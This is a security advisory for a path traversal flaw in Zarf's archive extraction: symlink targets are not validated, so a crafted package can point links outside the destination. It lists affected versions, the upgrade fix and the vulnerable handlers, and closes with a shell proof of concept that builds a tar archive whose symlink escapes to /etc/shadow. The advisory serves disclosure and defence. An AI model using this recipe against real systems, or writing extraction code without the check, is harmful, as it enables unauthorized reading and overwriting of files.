# Zarf's symlink targets in archives are not validated against destination directory

**GHSA**: GHSA-hcm4-6hpj-vghm | **CVE**: CVE-2026-29064 | **Severity**: high (CVSS 8.2)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/zarf-dev/zarf/src/pkg/archive** (go): >= 0.54.0, < 0.73.1

## Description

### Summary

A path traversal vulnerability in archive extraction allows a specifically crafted Zarf package to create symlinks pointing outside the destination directory, enabling arbitrary file read or write on the system processing the package.

### What users should do
Upgrade immediately to version v0.73.1

If developers cannot upgrade immediately, only process Zarf packages from fully trusted sources until the fix is applied.

If using trusted packages and archives - the only impact to this is updating zarf binary or SDK package versions. Previously created packages do not need to be rebuilt.

### Who is affected

- Any user of affected Zarf versions who processes packages from untrusted or semi-trusted sources. This includes packages received via file transfer, downloaded from registries, or shared across organizational boundaries. This includes use of the `zarf tools archiver decompress` functionality on generic archives.

- Any SDK consumers of Zarf for the affected versions who utilize package load or archive operations. 

### What is the risk

A malicious Zarf package or archive could create symlinks pointing to arbitrary locations on the filesystem. This could lead to unauthorized file reads, file overwrites, or in some scenarios, code execution on the system performing the extraction in the event a file on the system is both overwritten and executed. This vulnerability does not introduce an execution path explicitly.

### Mitigating Factors

If developers only process trusted packages and/or trusted archives (with `zarf tools archiver decompress), the risk is low. 

### Details

The archive extraction code in src/pkg/archive/archive.go creates symlinks from archive entries without validating that the symlink target resolves within the extraction destination directory. This affects all three extraction handler functions:

1. defaultHandler (on line 320): Joins `dst` with `f.LinkTarget`, but does not verify the resolved path stays under `dst`. This means that a LinkTarget of `"../../../../etc/shadow"` would resolve outside the destination after `filepath.Join`.
2. stripHandler (on line 342): Passes `f.LinkTarget` verbatim to `os.Symlink`.
3. filterHandler (on line 370): Similar to `defaultHandler`, the code joins but does not validate the `LinkTarget`.

The vulnerability is a symlink variant of the "Zip Slip" class (CVE-2018-1002200). An attacker constructs a Zarf package containing an archive entry with a malicious `f.LinkTarget`. When the package is extracted, `os.Symlink` creates a symlink pointing outside the extraction root. A subsequent archive entry targeting the same name can then read or write through the symlink to an arbitrary location on the filesystem.

### PoC

<details>
<summary>Proof of Concept</summary>
You may want to follow through these steps inside of a disposable environment (container, VM):

```bash
Reproduction via zarf tools archiver decompress (simplest)

This demonstrates the vulnerability using the defaultHandler (line 320).

# 1. Create a staging directory for the malicious archive contents.
mkdir -p /tmp/cve-repro/archive-contents

# 2. Create a symlink that traverses out of the extraction directory.
#    This symlink targets "../../../../../../../etc/shadow" relative to
#    whatever extraction destination is chosen.
cd /tmp/cve-repro/archive-contents
ln -s ../../../../../../../etc/shadow escape-link

# 3. Also create a regular file so the archive isn't empty besides the link.
echo "benign content" > readme.txt

# 4. Package into a tar.gz archive.
#    The --dereference flag is NOT used, so the symlink is stored as-is.
cd /tmp/cve-repro
tar -czf malicious.tar.gz -C archive-contents .

# 5. Verify the archive contains the symlink.
tar -tvf malicious.tar.gz
# Expected output includes:
#   lrwxrwxrwx ... ./escape-link -> ../../../../../../../etc/shadow

# 6. Create the extraction destination (deeply nested so the traversal
#    resolves to a real path).
mkdir -p /tmp/cve-repro/extract/a/b/c/d

# 7. Run the vulnerable extraction.
zarf tools archiver decompress malicious.tar.gz /tmp/cve-repro/extract/a/b/c/d

# 8. Verify the symlink was created pointing outside the destination.
ls -la /tmp/cve-repro/extract/a/b/c/d/escape-link
# Expected: escape-link /etc/shadow
#
# The symlink target resolves to /etc/shadow, which is OUTSIDE
# the extraction directory /tmp/cve-repro/extract/a/b/c/d/.

readlink -f /tmp/cve-repro/extract/a/b/c/d/escape-link
# Expected: /etc/shadow

What happened: defaultHandler (line 320) executed:
os.Symlink(filepath.Join(dst, f.LinkTarget), target)
// = os.Symlink("/tmp/cve-repro/extract/a/b/c/d/../../../../../../../etc/shadow",
//              "/tmp/cve-repro/extract/a/b/c/d/escape-link")
filepath.Join cleans the path to /etc/shadow, which is outside dst. No validation is performed.
```
</details>
